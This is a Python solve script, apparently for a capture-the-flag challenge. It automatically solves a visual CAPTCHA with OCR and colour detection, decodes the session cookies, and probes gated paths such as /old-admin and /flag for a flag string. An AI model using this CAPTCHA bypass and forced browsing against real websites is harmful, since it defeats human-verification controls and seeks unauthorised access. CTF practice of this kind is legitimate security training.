#!/usr/bin/env python3
import re, io, json, subprocess, tempfile, os, base64
import urllib.request, ssl, http.cookiejar
from PIL import Image, ImageOps
import numpy as np
B="https://kicyber-4bfe3faed6a6-locks-of-confusion1-0-0.chals.io"
ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
cj=http.cookiejar.CookieJar()
op=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj),urllib.request.HTTPSHandler(context=ctx))
def req(p,data=None,headers=None):
    r=urllib.request.Request(B+p,data=data,headers=headers or {})
    try: resp=op.open(r,timeout=25);return resp.getcode(),resp.read()
    except urllib.error.HTTPError as e:return e.code,(e.read() or b"")
def ocr(img):
    g=ImageOps.invert(img.convert("L").point(lambda p:255 if p>90 else 0)).resize((img.width*2,img.height*2))
    with tempfile.NamedTemporaryFile(suffix=".png",delete=False) as f:g.save(f.name);fn=f.name
    try:out=subprocess.run(["tesseract",fn,"stdout","--psm","11","tsv"],capture_output=True,text=True).stdout
    finally:os.unlink(fn)
    w=[]
    for ln in out.splitlines()[1:]:
        c=ln.split("\t")
        if len(c)>=12 and c[11].strip():l,t,ww,hh=map(int,c[6:10]);w.append((c[11].strip().lower(),l//2,t//2,ww//2,hh//2))
    return w
def circ(img):
    a=np.asarray(img.convert("RGB")).astype(int);R,G,Bc=a[:,:,0],a[:,:,1],a[:,:,2]
    m=(Bc>90)&(Bc<230)&(Bc>R+20)&(Bc>G+10)&(R>30);ys,xs=np.where(m);cl=[]
    for x,y in zip(xs.tolist(),ys.tolist()):
        for c in cl:
            if abs(x-c[3])<40 and abs(y-c[4])<40:c[0]+=x;c[1]+=y;c[2]+=1;c[3]=c[0]/c[2];c[4]=c[1]/c[2];break
        else:cl.append([x,y,1,x,y])
    return [(int(c[3]),int(c[4])) for c in cl if c[2]>150]
for _ in range(80):
    _,h=req("/verify");html=h.decode();nonce=re.search(r'nonce = "([0-9a-f]+)"',html).group(1)
    _,png=req(f"/verify/image/{nonce}");img=Image.open(io.BytesIO(png))
    words=ocr(img);cen=circ(img);done=False
    for t,lx,ly,lw,lh in words:
        if "cache-02" in t.replace(" ",""):
            lcx=lx+lw//2;cand=[c for c in cen if c[1]<ly and abs(c[0]-lcx)<45]
            cx,cy=(min(cand,key=lambda c:abs(c[0]-lcx)+abs(c[1]-(ly-35))) if cand else (lcx,max(0,ly-38)))
            _,r=req("/verify/check",data=json.dumps({"nonce":nonce,"x":cx,"y":cy}).encode(),headers={"Content-Type":"application/json"})
            if b'"ok":true' in r.replace(b" ",b""):done=True
            break
    if done:break
print("verified; cookies:")
for c in cj:
    print(f"  {c.name} = {c.value}")
    # try to decode as JWT / flask session
    parts=c.value.split(".")
    print("  parts:",len(parts))
    for i,seg in enumerate(parts[:2]):
        try:
            pad=seg+"="*(-len(seg)%4)
            dec=base64.urlsafe_b64decode(pad)
            print(f"   seg{i}:",dec[:200])
        except Exception as e:
            print(f"   seg{i}: (not b64) {seg[:40]}")
# retry gated paths with the session
for p in ["/internal-only/","/old-admin/","/internal-only","/old-admin","/flag","/flag.txt","/admin","/archive/","/archive/flag.txt"]:
    code,body=req(p)
    import re as _re
    fl=_re.search(rb"KPMG_CTF\{[^}]*\}",body)
    print(f"[{code}] {p}  {'FLAG='+fl.group(0).decode() if fl else ''} {body[:60]!r}")
